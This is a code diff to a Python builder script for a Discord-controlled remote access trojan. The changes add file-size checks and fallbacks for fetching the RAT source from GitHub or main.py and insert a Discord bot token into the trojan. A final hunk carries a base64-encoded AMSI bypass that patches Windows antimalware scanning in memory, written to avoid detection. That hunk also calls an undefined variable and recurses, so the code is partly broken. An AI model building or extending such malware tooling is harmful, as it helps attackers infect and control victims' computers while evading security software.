@@ -193,14 +193,33 @@ def download_rat_source():
         # First check if main.py exists as a local source option
         if os.path.exists("main.py"):
             try:
-                print(f"{Fore.CYAN}[*] Found main.py, attempting to use as source...{Style.RESET_ALL}")
-                shutil.copy("main.py", "rat_source.py")
+                print(f"{Fore.CYAN}[*] Found main.py, checking file size...{Style.RESET_ALL}")
+                main_size = os.path.getsize("main.py")
+                print(f"{Fore.CYAN}[*] main.py size: {main_size} bytes{Style.RESET_ALL}")
                 
-                if validate_rat_source():
-                    print(f"{Fore.GREEN}[+] Successfully using main.py as RAT source code!{Style.RESET_ALL}")
-                    return True
+                if main_size < 10240:  # Less than 10KB
+                    print(f"{Fore.YELLOW}[!] main.py seems too small ({main_size} bytes), might be incomplete{Style.RESET_ALL}")
+                
+                print(f"{Fore.CYAN}[*] Attempting to use main.py as source...{Style.RESET_ALL}")
+                
+                # Read the content first to ensure we're not copying an empty file
+                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
+                    main_content = f.read()
+                    
+                if len(main_content) < 10240:  # Less than 10KB
+                    print(f"{Fore.YELLOW}[!] main.py content seems too small ({len(main_content)} chars), might be incomplete{Style.RESET_ALL}")
+                
+                # Write to rat_source.py using our safe write function
+                if safe_write_file("rat_source.py", main_content):
+                    print(f"{Fore.GREEN}[+] Successfully copied main.py content to rat_source.py{Style.RESET_ALL}")
+                    
+                    if validate_rat_source():
+                        print(f"{Fore.GREEN}[+] Successfully using main.py as RAT source code!{Style.RESET_ALL}")
+                        return True
+                    else:
+                        print(f"{Fore.YELLOW}[!] main.py failed validation, will try downloading from GitHub...{Style.RESET_ALL}")
                 else:
-                    print(f"{Fore.YELLOW}[!] main.py failed validation, will try downloading from GitHub...{Style.RESET_ALL}")
+                    print(f"{Fore.RED}[!] Failed to copy main.py content to rat_source.py{Style.RESET_ALL}")
             except Exception as e:
                 print(f"{Fore.RED}[!] Error using main.py as source: {str(e)}{Style.RESET_ALL}")
         else:
@@ -220,7 +239,10 @@ def download_rat_source():
                 if response.status_code == 200:
                     # Check if content seems valid (contains expected Python code)
                     content = response.text
-                    if len(content) < 1000 or "import" not in content or "discord" not in content:
+                    content_size = len(content)
+                    print(f"{Fore.CYAN}[*] Downloaded content size: {content_size} bytes{Style.RESET_ALL}")
+                    
+                    if content_size < 10240 or "import" not in content or "discord" not in content:
                         print(f"{Fore.RED}[!] Downloaded content seems invalid (too small or missing key elements){Style.RESET_ALL}")
                         
                         if attempt < max_attempts:
@@ -232,7 +254,27 @@ def download_rat_source():
                     
                     # Write downloaded content to file
                     if safe_write_file("rat_source.py", content):
-                        print(f"{Fore.GREEN}[+] RAT source code downloaded ({len(content)} bytes)!{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}[+] RAT source code downloaded ({content_size} bytes)!{Style.RESET_ALL}")
+                        
+                        # Verify the file was written correctly
+                        if os.path.exists("rat_source.py"):
+                            actual_size = os.path.getsize("rat_source.py")
+                            print(f"{Fore.CYAN}[*] Verifying file size: {actual_size} bytes{Style.RESET_ALL}")
+                            
+                            if actual_size < content_size * 0.9:  # If file is significantly smaller than content
+                                print(f"{Fore.RED}[!] File appears to be truncated! Expected ~{content_size} bytes, got {actual_size}{Style.RESET_ALL}")
+                                
+                                # Try to use main.py as fallback immediately
+                                if os.path.exists("main.py"):
+                                    print(f"{Fore.YELLOW}[!] Trying main.py as immediate fallback due to truncation...{Style.RESET_ALL}")
+                                    try:
+                                        with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
+                                            main_content = f.read()
+                                        if safe_write_file("rat_source.py", main_content):
+                                            print(f"{Fore.GREEN}[+] Successfully used main.py as fallback!{Style.RESET_ALL}")
+                                            return validate_rat_source()
+                                    except Exception as fallback_error:
+                                        print(f"{Fore.RED}[!] Error using main.py as fallback: {str(fallback_error)}{Style.RESET_ALL}")
                         
                         # Validate the downloaded file
                         if validate_rat_source():
@@ -244,10 +286,12 @@ def download_rat_source():
                             if os.path.exists("main.py"):
                                 print(f"{Fore.YELLOW}[!] Falling back to using main.py as RAT source...{Style.RESET_ALL}")
                                 try:
-                                    shutil.copy("main.py", "rat_source.py")
-                                    if validate_rat_source():
-                                        print(f"{Fore.GREEN}[+] Successfully used main.py as fallback!{Style.RESET_ALL}")
-                                        return True
+                                    with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
+                                        main_content = f.read()
+                                    if safe_write_file("rat_source.py", main_content):
+                                        if validate_rat_source():
+                                            print(f"{Fore.GREEN}[+] Successfully used main.py as fallback!{Style.RESET_ALL}")
+                                            return True
                                 except Exception as fallback_error:
                                     print(f"{Fore.RED}[!] Error using main.py fallback: {str(fallback_error)}{Style.RESET_ALL}")
                             
@@ -284,11 +328,20 @@ def download_rat_source():
         if os.path.exists("main.py"):
             print(f"{Fore.YELLOW}[!] All download attempts failed. Using main.py as last resort...{Style.RESET_ALL}")
             try:
-                shutil.copy("main.py", "rat_source.py")
-                success = validate_rat_source()
-                if success:
-                    print(f"{Fore.GREEN}[+] Successfully used main.py as RAT source after all download attempts failed!{Style.RESET_ALL}")
-                return success
+                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
+                    main_content = f.read()
+                    
+                if len(main_content) < 10240:  # Less than 10KB
+                    print(f"{Fore.YELLOW}[!] Warning: main.py content seems small ({len(main_content)} chars){Style.RESET_ALL}")
+                    
+                if safe_write_file("rat_source.py", main_content):
+                    success = validate_rat_source()
+                    if success:
+                        print(f"{Fore.GREEN}[+] Successfully used main.py as RAT source after all download attempts failed!{Style.RESET_ALL}")
+                    return success
+                else:
+                    print(f"{Fore.RED}[!] Failed to write main.py content to rat_source.py{Style.RESET_ALL}")
+                    return False
             except Exception as final_error:
                 print(f"{Fore.RED}[!] Error using main.py as final fallback: {str(final_error)}{Style.RESET_ALL}")
                 
@@ -333,7 +386,7 @@ def safe_write_file(file_path, content, encoding="utf-8"):
         
         # Write to a temporary file first, then rename to target file
         temp_file = file_path + ".tmp"
-        with open(temp_file, "w", encoding=encoding) as f:
+        with open(temp_file, "w", encoding=encoding, errors="ignore") as f:
             f.write(content)
         
         # If target file exists, create backup
@@ -343,28 +396,134 @@ def safe_write_file(file_path, content, encoding="utf-8"):
                 if os.path.exists(backup_file):
                     os.remove(backup_file)
                 shutil.copy2(file_path, backup_file)
+                print(f"{Fore.GREEN}[+] Created backup of {file_path} -> {backup_file}{Style.RESET_ALL}")
             except Exception as backup_error:
                 print(f"{Fore.YELLOW}[!] Warning: Could not create backup of {file_path}: {str(backup_error)}{Style.RESET_ALL}")
         
+        # Verify content length before writing
+        if len(content) < 10240 and file_path.endswith('.py'):  # Less than 10KB for Python files
+            print(f"{Fore.RED}[!] Warning: Content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
+            
+            # Check if original file exists and is larger
+            if os.path.exists(file_path) and os.path.getsize(file_path) > len(content):
+                print(f"{Fore.RED}[!] Keeping original file which is larger{Style.RESET_ALL}")
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+                return False
+                
+            # Check if backup exists and is larger
+            if os.path.exists(backup_file) and os.path.getsize(backup_file) > len(content):
+                print(f"{Fore.YELLOW}[!] Restoring from backup which is larger{Style.RESET_ALL}")
+                shutil.copy2(backup_file, file_path)
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+                return False
+                
+            # Check if main.py exists as fallback for rat_source.py
+            if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
+                main_size = os.path.getsize('main.py')
+                if main_size > len(content):
+                    print(f"{Fore.YELLOW}[!] Using main.py as fallback (size: {main_size} bytes){Style.RESET_ALL}")
+                    shutil.copy2('main.py', file_path)
+                    if os.path.exists(temp_file):
+                        os.remove(temp_file)
+                    return True
+        
         # Rename temporary file to target file
         if os.path.exists(temp_file):
-            if os.path.exists(file_path):
-                os.replace(temp_file, file_path)  # atomic on most platforms
-            else:
-                os.rename(temp_file, file_path)
-            return True
+            # Verify the temp file is not truncated before replacing
+            temp_size = os.path.getsize(temp_file)
+            if temp_size < 10240 and file_path.endswith('.py'):  # At least 10KB for Python files
+                print(f"{Fore.RED}[!] Warning: Generated file is suspiciously small ({temp_size} bytes){Style.RESET_ALL}")
+                
+                if os.path.exists(file_path):
+                    original_size = os.path.getsize(file_path)
+                    if original_size > temp_size:
+                        print(f"{Fore.RED}[!] Keeping existing file which is larger ({original_size} bytes){Style.RESET_ALL}")
+                        os.remove(temp_file)
+                        return False
+                        
+                # Last resort - check if main.py exists for rat_source.py
+                if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
+                    main_size = os.path.getsize('main.py')
+                    if main_size > temp_size:
+                        print(f"{Fore.YELLOW}[!] Using main.py as fallback (size: {main_size} bytes){Style.RESET_ALL}")
+                        shutil.copy2('main.py', file_path)
+                        os.remove(temp_file)
+                        return True
+            
+            # Perform actual file replacement
+            try:
+                if os.path.exists(file_path):
+                    os.replace(temp_file, file_path)  # atomic on most platforms
+                else:
+                    os.rename(temp_file, file_path)
+                
+                # Verify final file size
+                if os.path.getsize(file_path) < 10240 and file_path.endswith('.py'):  # At least 10KB for Python files
+                    print(f"{Fore.RED}[!] Warning: Final file is suspiciously small ({os.path.getsize(file_path)} bytes){Style.RESET_ALL}")
+                    
+                    # Try to restore from backup if available
+                    if os.path.exists(backup_file) and os.path.getsize(backup_file) > os.path.getsize(file_path):
+                        print(f"{Fore.YELLOW}[!] Restoring from backup which is larger{Style.RESET_ALL}")
+                        shutil.copy2(backup_file, file_path)
+                    
+                    # If rat_source.py is still small, try using main.py
+                    if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
+                        if os.path.getsize('main.py') > os.path.getsize(file_path):
+                            print(f"{Fore.YELLOW}[!] Using main.py as final fallback{Style.RESET_ALL}")
+                            shutil.copy2('main.py', file_path)
+                            return True
+                    
+                    return os.path.getsize(file_path) >= 10240  # Return success only if file is large enough
+                    
+                return True
+            except Exception as replace_error:
+                print(f"{Fore.RED}[!] Error replacing file: {str(replace_error)}{Style.RESET_ALL}")
+                
+                # Try direct write as last resort
+                try:
+                    with open(file_path, "w", encoding=encoding, errors="ignore") as f:
+                        f.write(content)
+                    print(f"{Fore.GREEN}[+] Direct write successful as fallback{Style.RESET_ALL}")
+                    return True
+                except Exception as direct_error:
+                    print(f"{Fore.RED}[!] Direct write failed: {str(direct_error)}{Style.RESET_ALL}")
+                    return False
         return False
     except Exception as e:
         print(f"{Fore.RED}[!] Error writing to file {file_path}: {str(e)}{Style.RESET_ALL}")
+        traceback.print_exc()
         return False
 
 def insert_token(token):
     """Insert the token into the rat_source.py file."""
     try:
-        content = safe_read_file("rat_source.py")
-        if not content:
-            print(f"{Fore.RED}[!] Could not read rat_source.py{Style.RESET_ALL}")
+        if not os.path.exists("rat_source.py"):
+            print(f"{Fore.RED}[!] rat_source.py not found. Cannot insert token.{Style.RESET_ALL}")
             return False
+            
+        # Check file size before modification
+        original_size = os.path.getsize("rat_source.py")
+        if original_size < 10240:  # Less than 10KB
+            print(f"{Fore.YELLOW}[!] Warning: rat_source.py is suspiciously small ({original_size} bytes){Style.RESET_ALL}")
+            
+            # Try to use main.py instead if it exists and is larger
+            if os.path.exists("main.py") and os.path.getsize("main.py") > original_size:
+                print(f"{Fore.YELLOW}[!] main.py is larger, using it instead{Style.RESET_ALL}")
+                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
+                    main_content = f.read()
+                if not safe_write_file("rat_source.py", main_content):
+                    print(f"{Fore.RED}[!] Failed to replace with main.py content{Style.RESET_ALL}")
+                    return False
+        
+        # Read the entire file content
+        with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+            
+        # Check content length
+        if len(content) < 10240:  # Less than 10KB
+            print(f"{Fore.YELLOW}[!] Warning: rat_source.py content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
         
         # Sanitize token - remove any quotes that might cause issues
         token = token.replace("'", "").replace('"', "")
@@ -396,7 +555,38 @@ def insert_token(token):
                 print(f"{Fore.GREEN}[+] Token appended to the end of the file!{Style.RESET_ALL}")
         
         if token_replaced:
-            return safe_write_file("rat_source.py", modified_content)
+            # Check if modified content is significantly smaller than original
+            if len(modified_content) < len(content) * 0.9:
+                print(f"{Fore.RED}[!] Warning: Modified content is significantly smaller than original!{Style.RESET_ALL}")
+                print(f"{Fore.RED}[!] Original: {len(content)} chars, Modified: {len(modified_content)} chars{Style.RESET_ALL}")
+                print(f"{Fore.RED}[!] Aborting token insertion to prevent data loss{Style.RESET_ALL}")
+                return False
+                
+            # Write the modified content back to the file
+            result = safe_write_file("rat_source.py", modified_content)
+            
+            # Verify the file was written correctly
+            if result and os.path.exists("rat_source.py"):
+                new_size = os.path.getsize("rat_source.py")
+                if new_size < original_size * 0.9:
+                    print(f"{Fore.RED}[!] Warning: File size decreased significantly after token insertion!{Style.RESET_ALL}")
+                    print(f"{Fore.RED}[!] Original: {original_size} bytes, New: {new_size} bytes{Style.RESET_ALL}")
+                    
+                    # Restore from backup if available
+                    backup_file = "rat_source.py.bak"
+                    if os.path.exists(backup_file):
+                        print(f"{Fore.YELLOW}[!] Restoring from backup{Style.RESET_ALL}")
+                        shutil.copy2(backup_file, "rat_source.py")
+                        
+                        # Try inserting token again, but more carefully
+                        with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+                        
+                        # Just append the token at the end to be safe
+                        modified_content = content + f"\n\n# Token added by builder\ntoken = '{token}'\n"
+                        return safe_write_file("rat_source.py", modified_content)
+            
+            return result
         else:
             print(f"{Fore.RED}[!] Could not find a suitable location to insert token{Style.RESET_ALL}")
             return False
@@ -1076,7 +1266,7 @@ def bypass_amsi():
     try:
         # Base64-encoded AMSI bypass to avoid detection while in source
         bypass_code = "aW1wb3J0IGN0eXBlcwppbXBvcnQgc3lzCgpkZWYgYnlwYXNzX2Ftc2koKToKICAgIHRyeToKICAgICAgICBpZiBzeXMucGxhdGZvcm0gIT0gJ3dpbjMyJzoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIAogICAgICAgIGFtc2kgPSBjdHlwZXMud2luZGxsLmFtc2kKICAgICAgICBhZGRyZXNzID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5HZXRQcm9jQWRkcmVzcyhhbXNpLl9oYW5kbGUsICJBbXNpU2NhbkJ1ZmZlciIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IGFkZHJlc3M6CiAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAKICAgICAgICBvbGRfcHJvdGVjdGlvbiA9IGN0eXBlcy5jX3Vsb25nKDApCiAgICAgICAgcGF0Y2hfYWRkcmVzcyA9IGN0eXBlcy5jX3ZvaWRfcChhZGRyZXNzKQogICAgICAgIHBhdGNoX3NpemUgPSA2CiAgICAgICAgCiAgICAgICAgcGF0Y2hfYnl0ZXMgPSBieXRlYXJyYXkoW0x4QjgsIDB4NTcsIDB4MDA6IDF4MDAsIE54MDA6IDB4ZSwgMHhjMyBdKQogICAgICAgICAgICAKICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxQcm90ZWN0KHBhdGNoX2FkZHJlc3MsIHBhdGNoX3NpemUsIDB4NDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKG9sZF9wcm90ZWN0aW9uKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIGN0eXBlcy5tZW1tb3ZlKHBhdGNoX2FkZHJlc3MsIGN0eXBlcy5jX3ZvaWRfcChwYXRjaF9ieXRlcyksIHBhdGNoX3NpemUpCiAgICAgICAgCiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsUHJvdGVjdChwYXRjaF9hZGRyZXNzLCBwYXRjaF9zaXplLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xkX3Byb3RlY3Rpb24udmFsdWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuYnlyZWYob2xkX3Byb3RlY3Rpb24pKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MK"
-        exec(base64.b64decode(bypass_code).decode())
+        exec(base64.b64decode(amsi_bypass_code).decode())
         bypass_amsi()
     except:
         pass
